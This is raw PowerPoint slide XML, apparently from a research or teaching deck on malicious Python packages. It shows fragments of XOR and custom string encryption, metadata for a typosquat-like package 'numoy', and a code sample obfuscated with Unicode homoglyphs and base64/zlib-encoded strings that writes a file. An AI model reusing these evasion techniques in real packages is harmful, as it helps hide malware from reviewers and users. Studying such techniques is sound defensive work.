          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1530271" y="2240072"/>
            <a:ext cx="6083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E45963-6822-380A-8DD0-824C96EC0DE4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011230" y="2282314"/>
            <a:ext cx="8460000" cy="8810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807F7973-7A55-2563-8BDC-07CF2EC19EFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011230" y="2240072"/>
            <a:ext cx="8444865" cy="923329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key_array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[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0x76, 0x21, 0xfe, 0xcc, 0xee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xrange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(string)):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encd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chr(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ord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(string[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]) ^ t[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% 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(t)]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519ABA-F4A6-45A8-2125-B6F6C2107AB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943850" y="5915025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XOR Encryption</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21539454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8AF5-D1F7-9D5B-F911-E9DB242A2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5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45B66238-1079-5634-8191-74E14959969E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1502972" y="1727391"/>
            <a:ext cx="6083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4EFBFB0-FB2F-B0E0-D531-09F45CC2BBD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983931" y="1769634"/>
            <a:ext cx="8460000" cy="198908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文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{186972ED-F6F6-F08E-928B-F32FEDE53059}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983931" y="1727392"/>
            <a:ext cx="8444865" cy="203132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 encrypt(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message,corruptchanname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for x in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message.content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if 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random.randint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(1,2) == 1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corruptchanname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+= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1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asciigen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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else: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corruptchanname</a:t>
            </a:r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+= x   </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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US" altLang="zh-CN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corruptchanname</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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C6E9AE-C488-08D1-D860-A509FC135206}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9874250" y="6090516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Customized encrypt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3482221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5DE1-109E-CE46-9BEC-F84574D04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8D4DDB-B8BC-BB3F-EB9A-4A29B3BF902E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9874250" y="6090516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metadata</a:t>
            </a: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AC4C0AE2-0061-A8C9-4724-E96AA93385C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2010194" y="3651934"/>
            <a:ext cx="6006971" cy="139348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Name: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0" err="1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numoy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="14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Version: 0.6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Summary: Security project for PoC.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Home-page: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https://google.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808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Author: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zer0ul</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1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Author-email: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill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zer0ul@vulnium.com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0F151F-F3D4-0BE4-A0F1-2FED1D639F18}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1629970" y="3660424"/>
            <a:ext cx="3802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47652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9B92-4019-4DB4-269F-20C43D0F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CE470D-6A4C-57E5-9935-CD608B6E0159}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9874250" y="6090516"/>
            <a:ext cx="318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Code obfuscation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06CB4B48-E9A2-86B0-6553-DA9176CA4606}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2010194" y="3651933"/>
            <a:ext cx="6006971" cy="2031325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if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𝘪𝙣𝘧𝙤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!= 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𝘪𝙢𝗽𝗼𝙧𝘁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__('base64').b64decode(__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𝘪𝗺𝙥𝗼𝙧𝘁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zlib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').decompress(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b'x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xda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\x03\x00\x00\x00\x00\x01')).decode():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr latinLnBrk="1"/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with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𝘰𝗽𝙚𝗻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𝘪𝗺𝗽𝗼𝙧𝙩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__('base64').b64decode(__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𝘪𝙢𝗽𝘰𝙧𝘁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zlib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').decompress(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b'x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\xdaK56L\x0er\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xcf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\xa9\x8a4\xb2\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xac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\x8crv*H\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xca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\x8d*\xf3\xc9\x0b2Iq\xb4\xb5\x05\x00\x86d\t6')).decode().format(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𝙨𝙚𝘭𝗳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dir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), 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𝗶𝗺𝗽𝗼𝙧𝘁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__('base64').b64decode(__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𝙞𝗺𝘱𝙤𝘳𝘵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__('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zlib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').decompress(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b'x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\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>xdaK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)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as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𝙛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   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𝙛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.write(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𝘀𝙩𝙧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𝘪𝘯𝘧𝙤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endParaRPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="C0C0C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7625E1-4FA9-5142-9D41-292D021FDB00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1629970" y="3660424"/>
            <a:ext cx="3802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altLang="zh-CN" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808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21793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</TotalTime>
  <Words>2469</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>392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等线</vt:lpstr>
      <vt:lpstr>等线 Light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火华 李</dc:creator>
  <cp:lastModifiedBy>Kaifeng Huang</cp:lastModifiedBy>
  <cp:revision>27</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-07-19T16:58:31Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-22T03:20:34Z</dcterms:modified>
</cp:coreProperties>
</file>